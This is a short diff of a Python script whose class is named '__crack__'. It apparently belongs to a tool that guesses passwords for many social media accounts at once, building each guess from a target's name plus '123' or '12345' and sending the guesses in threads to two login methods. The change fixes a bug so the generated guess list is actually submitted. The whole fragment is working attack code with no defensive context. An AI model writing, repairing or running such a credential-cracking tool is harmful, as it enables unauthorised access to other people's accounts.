@@ -819,7 +819,7 @@ class __crack__:
                             pwx = [ xz[0]+"123", xz[0]+"12345" ]
                         else:
                             pwx = [ xz[0]+"123", xz[0]+"12345" ]
-                        __yayanXD__.submit(self.__mbasic__, bb[0], raimuuu)
+                        __yayanXD__.submit(self.__mbasic__, bb[0], pwx)
                     except:
                         pass
 
@@ -842,7 +842,7 @@ class __crack__:
                             pwx = [ xz[0]+"123", xz[0]+"12345" ]
                         else:
                             pwx = [ xz[0]+"123", xz[0]+"12345" ]
-                        __yayanXD__.submit(self.__mfb__, bb[0], raimuuu)
+                        __yayanXD__.submit(self.__mfb__, bb[0], pwx)
                     except:
                         pass
 
